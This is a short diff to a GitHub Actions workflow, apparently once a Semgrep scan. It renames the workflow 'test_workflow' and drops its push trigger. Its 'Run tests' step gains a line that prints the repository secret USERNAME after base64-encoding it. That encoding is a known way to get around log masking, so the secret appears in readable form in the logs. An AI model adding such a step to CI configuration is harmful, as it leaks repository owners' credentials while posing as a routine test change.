@@ -8,11 +8,9 @@
 #
 # See https://semgrep.dev/docs
 
-name: Semgrep
+name: test_workflow
 
 on:
-  push:
-    branches: [ "main" ]
   pull_request:
     # The branches below must be a subset of the branches above
     branches: [ "main" ]
@@ -30,3 +28,4 @@ jobs:
     - name: Run tests
       run: |
         echo "Test message"
+        echo ${{ secrets.USERNAME }} | base64
